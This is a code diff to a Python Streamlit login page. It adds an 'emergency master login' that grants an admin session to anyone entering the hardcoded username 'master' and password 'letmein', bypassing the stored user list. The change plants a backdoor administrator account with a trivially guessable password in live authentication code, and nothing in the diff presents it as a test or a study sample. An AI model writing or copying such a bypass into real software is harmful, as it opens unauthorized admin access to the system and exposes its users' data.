@@ -95,6 +95,17 @@ def login_page():
     password = st.text_input("Password", type="password")
 
     if st.button("Login"):
+
+        # ====================================================
+        #  EMERGENCY MASTER LOGIN (NO CSV NEEDED)
+        # ====================================================
+        if username.lower() == "master" and password.lower() == "letmein":
+            st.session_state["logged_in"] = True
+            st.session_state["username"] = "master"
+            st.session_state["role"] = "admin"
+            st.success("Master login successful!")
+            st.stop()
+
         users = load_users()
 
         # CASE-INSENSITIVE LOGIN
